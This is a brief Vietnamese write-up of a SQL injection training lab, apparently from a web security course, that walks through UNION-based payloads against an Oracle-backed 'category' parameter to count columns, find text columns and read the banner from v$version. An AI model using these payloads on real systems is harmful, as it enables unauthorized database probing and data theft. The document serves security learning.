# SQL Injection Lab 03: Oracle Version

## Mục tiêu
Khai thác SQLi tại tham số `category` để lấy thông tin phiên bản Oracle từ `v$version`.

## Đề bài
<img src="images/image.png" alt="Lab overview" width="760" />
<br><br>

## Bước 1: Xác định số cột của truy vấn
Payload thử lỗi:

```sql
' union select null from dual--
```

Payload thành công:

```sql
' union select null, null from dual--
```

<img src="images/image-2.png" alt="Union 1 cột lỗi" width="760" />
<img src="images/image-3.png" alt="Union 2 cột thành công" width="760" />
<br><br>

## Bước 2: Xác định cột có thể hiển thị text

```sql
' union select 'abc', 'bcd' from dual--
```

<img src="images/image-4.png" alt="Kiểm tra cột text" width="760" />
<br><br>

## Bước 3: Lấy thông tin phiên bản Oracle

```sql
' union select banner, null from v$version--
```

<img src="images/image-5.png" alt="Kết quả version Oracle" width="760" />
<br><br>

## Payload solve

```sql
' union select banner, null from v$version--
```

## Kết quả
Lấy được thông tin version Oracle và hoàn thành lab.
